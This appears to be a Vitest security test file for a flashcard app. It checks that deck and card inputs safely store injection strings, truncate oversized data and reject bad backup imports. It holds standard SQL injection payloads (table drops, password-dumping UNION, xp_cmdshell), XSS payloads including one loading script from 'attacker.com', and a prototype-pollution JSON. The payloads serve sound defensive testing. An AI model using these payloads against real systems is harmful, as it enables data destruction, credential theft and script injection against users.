import { describe, it, expect, vi, beforeEach } from 'vitest'
import prisma from '../../src/lib/prisma'
import { createDeck } from '../../src/actions/decks'
import { addCard, addCardsBulk, updateCardDetails } from '../../src/actions/cards'
import { validateBackupData, MAX_DECKS_PER_IMPORT, MAX_CARDS_PER_DECK } from '../../src/lib/validations/import'

vi.mock('../../src/lib/prisma', () => {
  return {
    default: {
      deck: {
        create: vi.fn(async ({ data }) => ({ id: 'deck-uuid-123', ...data })),
        findUnique: vi.fn(),
        delete: vi.fn(),
      },
      card: {
        create: vi.fn(async ({ data }) => ({ id: 'card-uuid-456', ...data })),
        createMany: vi.fn(async ({ data }) => ({ count: data.length })),
        update: vi.fn(async ({ data }) => ({ id: 'card-uuid-456', ...data })),
      },
    },
  }
})

vi.mock('next/cache', () => ({
  revalidatePath: vi.fn(),
}))

vi.mock('../../src/lib/auth-guard', () => ({
  requireAppAuth: vi.fn(async () => {}),
}))

describe('Security Audit: Injection & Input Validation Defenses', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  describe('SQL Injection Payloads (Parameterized Query Safety)', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE \"Deck\"; --",
      "1; DROP TABLE Card CASCADE; --",
      "' UNION SELECT null, username, password FROM User --",
      "admin' --",
      "\" OR \"\"=\"",
      "'; EXEC xp_cmdshell('dir'); --",
      "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DATABASE()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
    ]

    sqlInjectionPayloads.forEach((payload) => {
      it(`safely handles SQL injection payload in deck title: "${payload}"`, async () => {
        const deck = await createDeck(payload, 'Test Description')
        expect(deck.title).toBe(payload)
        expect(prisma.deck.create).toHaveBeenCalledWith({
          data: {
            title: payload,
            description: 'Test Description',
          },
        })
      })

      it(`safely handles SQL injection payload in card fields: "${payload}"`, async () => {
        const card = await addCard(
          'deck-123',
          payload,
          'Translation',
          payload,
          payload,
          payload,
          payload
        )
        expect(card.front).toBe(payload)
        expect(prisma.card.create).toHaveBeenCalled()
      })
    })
  })

  describe('XSS Payloads (Storage as Literal Text)', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(document.domain)">',
      '<svg/onload=alert`1`>',
      '"><script src="https://attacker.com/evil.js"></script>',
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<body onload=alert(1)>',
    ]

    xssPayloads.forEach((payload) => {
      it(`stores XSS payload as literal sanitized string in card: "${payload}"`, async () => {
        const card = await addCard('deck-123', payload, 'Answer', payload)
        expect(card.front).toBe(payload)
      })
    })
  })

  describe('Input Size Boundary & Truncation Defenses', () => {
    it('truncates oversized deck title to 200 characters to prevent buffer issues', async () => {
      const massiveTitle = 'A'.repeat(5000)
      const deck = await createDeck(massiveTitle)
      expect(deck.title.length).toBe(200)
    })

    it('rejects empty or whitespace-only deck title', async () => {
      await expect(createDeck('')).rejects.toThrow('Titel darf nicht leer sein')
      await expect(createDeck('    ')).rejects.toThrow('Titel darf nicht leer sein')
    })

    it('truncates oversized card front and back to 2000 characters', async () => {
      const massiveText = 'B'.repeat(5000)
      const card = await addCard('deck-123', massiveText, massiveText)
      expect(card.front.length).toBe(2000)
      expect(card.back.length).toBe(2000)
    })

    it('limits bulk card creation to 500 items max', async () => {
      const oversizedCards = Array.from({ length: 600 }, (_, i) => ({
        front: `Word ${i}`,
        back: `Wort ${i}`,
      }))

      await addCardsBulk('deck-123', oversizedCards)
      const callData = (prisma.card.createMany as any).mock.calls[0][0].data
      expect(callData.length).toBe(500)
    })
  })

  describe('Malicious JSON Backup Payloads & Prototype Pollution', () => {
    it('safely handles prototype pollution attempt (__proto__ injection)', () => {
      const poisonPayload = JSON.parse(`{
        "version": 2,
        "__proto__": { "polluted": "yes" },
        "decks": [
          {
            "title": "Clean Deck",
            "cards": [{ "front": "test", "back": "test" }]
          }
        ]
      }`)

      const result = validateBackupData(poisonPayload)
      expect(result.success).toBe(true)
      // Check that Object prototype was not contaminated
      expect((Object.prototype as any).polluted).toBeUndefined()
    })

    it('rejects backup with excessive number of decks (> MAX_DECKS_PER_IMPORT)', () => {
      const excessiveDecks = Array.from({ length: MAX_DECKS_PER_IMPORT + 1 }, (_, i) => ({
        title: `Deck ${i}`,
      }))

      const result = validateBackupData({ version: 2, decks: excessiveDecks })
      expect(result.success).toBe(false)
      if (!result.success) {
        expect(result.error).toContain(`Maximal ${MAX_DECKS_PER_IMPORT} Decks`)
      }
    })

    it('rejects backup with excessive cards per deck (> MAX_CARDS_PER_DECK)', () => {
      const excessiveCards = Array.from({ length: MAX_CARDS_PER_DECK + 1 }, (_, i) => ({
        front: `F ${i}`,
        back: `B ${i}`,
      }))

      const result = validateBackupData([
        {
          title: 'Big Deck',
          cards: excessiveCards,
        },
      ])
      expect(result.success).toBe(false)
      if (!result.success) {
        expect(result.error).toContain(`Maximal ${MAX_CARDS_PER_DECK} Karten pro Deck`)
      }
    })

    it('rejects invalid numeric inputs such as NaN or out-of-bounds ease factor', () => {
      const result = validateBackupData([
        {
          title: 'Deck with Invalid Numbers',
          cards: [
            {
              front: 'word',
              back: 'wort',
              easeFactor: 99.9, // max allowed is 5.0
            },
          ],
        },
      ])
      expect(result.success).toBe(false)
      if (!result.success) {
        expect(result.error).toContain('Ease-Factor darf maximal 5.0 sein')
      }
    })
  })
})
